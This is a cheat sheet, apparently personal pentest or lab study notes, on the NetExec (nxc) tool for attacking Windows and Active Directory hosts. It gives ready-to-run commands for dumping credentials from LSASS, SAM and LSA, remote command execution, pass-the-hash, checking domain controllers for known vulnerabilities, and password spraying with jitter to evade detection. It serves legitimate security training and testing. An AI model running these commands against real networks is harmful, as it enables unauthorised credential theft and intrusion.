# NXC (NetExec) — SMB Credential Testing & Post-Exploitation

NetExec (`nxc`) is a network exploitation tool for Windows/AD environments. It replaced CrackMapExec (CME).
Think of it as: authenticate to a machine → do something with that access.

---

## Understanding Output Symbols
```
[*]  = Informational (just telling you something happened)
[+]  = Success (auth worked)
[-]  = Failed or warning

(Pwn3d!)     = You are local admin — you can run commands, dump creds, etc.
(no output)  = Valid creds, but not admin
```

---

## Protocols

nxc supports: smb, ldap, winrm, wmi, mssql, ssh, ftp, vnc, rdp, nfs

---

## Basic Syntax
```
nxc <protocol> <target(s)> -u <user> -p <password>
```

---

## Protocol Examples

### SMB (port 445) — Windows file sharing, most common for AD attacks
```
nxc smb 192.168.158.159 -u 'Eric.Wallows' -p 'EricLikesRunning800'
```

### LDAP (port 389) — Query Active Directory directly (users, groups, policies)
```
nxc ldap 192.168.158.158 -u 'o.foller' -p 'EarlyMorningFootball777'
```

### WinRM (port 5985) — Windows Remote Management, used by Evil-WinRM
```
nxc winrm 192.168.158.159 -u 'Eric.Wallows' -p 'EricLikesRunning800'
```

### WMI (port 135) — Windows Management Instrumentation, remote command execution
```
nxc wmi 192.168.158.159 -u 'Eric.Wallows' -p 'EricLikesRunning800'
```

### MSSQL (port 1433) — Microsoft SQL Server
```
nxc mssql 192.168.158.159 -u 'sa' -p 'Password123'
```

### SSH (port 22) — Linux or Windows SSH
```
nxc ssh 192.168.158.159 -u 'root' -p 'Password123'
```

### FTP (port 21) — File Transfer Protocol, check for anonymous access
```
nxc ftp 192.168.158.159 -u 'anonymous' -p ''
```

### VNC (port 5900) — Virtual Network Computing, remote desktop
```
nxc vnc 192.168.158.159 -u 'admin' -p 'Password123'
```

### RDP (port 3389) — Remote Desktop Protocol
```
nxc rdp 192.168.158.159 -u 'Eric.Wallows' -p 'EricLikesRunning800'
```

### NFS (port 2049) — Network File Share, common on Linux
```
nxc nfs 192.168.158.159 -u '' -p ''
```

---

## Modules (-M flag)

Modules are protocol-specific. Not every module works on every protocol.
Always check what's available for the protocol you're using:
```
nxc smb -L       <- list all SMB modules
nxc ldap -L      <- list all LDAP modules
nxc ssh -L       <- etc.
```

Run multiple modules in one command:
```
nxc smb 192.168.158.159 -u 'Eric.Wallows' -p 'EricLikesRunning800' -M lsassy -M spider_plus
```

---

## SMB Modules

### lsassy — Dump credentials from LSASS memory (requires Pwn3d!)
```
nxc smb 192.168.158.159 -u 'Eric.Wallows' -p 'EricLikesRunning800' -M lsassy
```
- Reads LSASS process in memory (stores creds of logged-in users)
- Returns: plaintext passwords, NTLM hashes, Kerberos tickets
- Tickets saved to: /home/kali/.nxc/modules/lsassy

### nanodump — Alternative LSASS dumper if lsassy fails
```
nxc smb 192.168.158.159 -u 'Eric.Wallows' -p 'EricLikesRunning800' -M nanodump
```

### spider_plus — List and index all readable SMB shares and files
```
nxc smb 192.168.158.159 -u 'Eric.Wallows' -p 'EricLikesRunning800' -M spider_plus
```

### gpp_password — Find passwords stored in Group Policy Preferences (classic vuln)
```
nxc smb 192.168.158.159 -u 'Eric.Wallows' -p 'EricLikesRunning800' -M gpp_password
```

### zerologon / petitpotam / nopac — Check if DC is vulnerable
```
nxc smb 192.168.158.159 -u 'Eric.Wallows' -p 'EricLikesRunning800' -M zerologon
nxc smb 192.168.158.159 -u 'Eric.Wallows' -p 'EricLikesRunning800' -M petitpotam
nxc smb 192.168.158.159 -u 'Eric.Wallows' -p 'EricLikesRunning800' -M nopac
```

### enum_av — Detect antivirus / endpoint protection on the target
```
nxc smb 192.168.158.159 -u 'Eric.Wallows' -p 'EricLikesRunning800' -M enum_av
```

### webdav — Check if WebClient service is running (used in relay attacks)
```
nxc smb 192.168.158.159 -u 'Eric.Wallows' -p 'EricLikesRunning800' -M webdav
```

### eventlog_creds / powershell_history / wifi / winscp — Misc cred hunting
```
nxc smb 192.168.158.159 -u 'Eric.Wallows' -p 'EricLikesRunning800' -M powershell_history
nxc smb 192.168.158.159 -u 'Eric.Wallows' -p 'EricLikesRunning800' -M wifi
nxc smb 192.168.158.159 -u 'Eric.Wallows' -p 'EricLikesRunning800' -M winscp
```

---

## LDAP Modules

### get-desc-users — Read user account descriptions (sometimes contain passwords!)
```
nxc ldap 192.168.158.158 -u 'o.foller' -p 'EarlyMorningFootball777' -M get-desc-users
```

### maq — Check MachineAccountQuota (can you add computers to domain?)
```
nxc ldap 192.168.158.158 -u 'o.foller' -p 'EarlyMorningFootball777' -M maq
```

### adcs — Enumerate Active Directory Certificate Services (AD CS)
```
nxc ldap 192.168.158.158 -u 'o.foller' -p 'EarlyMorningFootball777' -M adcs
```

### ldap-checker — Check if LDAP signing/binding is enforced
```
nxc ldap 192.168.158.158 -u 'o.foller' -p 'EarlyMorningFootball777' -M ldap-checker
```

### pre2k — Check for pre-Windows 2000 compatible accounts (weak auth)
```
nxc ldap 192.168.158.158 -u 'o.foller' -p 'EarlyMorningFootball777' -M pre2k
```

---

## WinRM — No modules, but supports direct cred dumping flags
```
nxc winrm 192.168.158.159 -u 'Eric.Wallows' -p 'EricLikesRunning800' --sam
nxc winrm 192.168.158.159 -u 'Eric.Wallows' -p 'EricLikesRunning800' --lsa
```

---

## Credential Dumping (built-in flags, no module needed)

These work directly on SMB with Pwn3d! access:
```
nxc smb 192.168.158.159 -u 'Eric.Wallows' -p 'EricLikesRunning800' --sam
nxc smb 192.168.158.159 -u 'Eric.Wallows' -p 'EricLikesRunning800' --lsa
nxc smb 192.168.158.159 -u 'Eric.Wallows' -p 'EricLikesRunning800' --dpapi
```

---

## Running Commands (requires Pwn3d!)
```
# CMD command
nxc smb 192.168.158.159 -u 'Eric.Wallows' -p 'EricLikesRunning800' -x 'whoami'

# PowerShell command
nxc smb 192.168.158.159 -u 'Eric.Wallows' -p 'EricLikesRunning800' -X 'Get-LocalUser'
```

---

## Pass-the-Hash (PTH)

Use an NTLM hash instead of a password — works anywhere -p works:
```
nxc smb 192.168.158.158 -u 'Administrator' -H 'a1fcb4118dfcbf52a53d6299aab57055'
nxc smb 192.168.158.0/24 -u 'Administrator' -H 'a1fcb4118dfcbf52a53d6299aab57055'
```

---

## Password Spraying Tips
```
# Spray one password across many users (add --continue-on-success to not stop at first hit)
nxc smb 192.168.158.0/24 -u users.txt -p 'Password123!' --continue-on-success

# Spray across multiple IPs
nxc smb 192.168.158.158 192.168.158.159 192.168.158.160 -u 'o.foller' -p 'EarlyMorningFootball777'

# Add jitter to avoid detection (5 second random delay between attempts)
nxc smb 192.168.158.0/24 -u users.txt -p passwords.txt --jitter 5
```

---
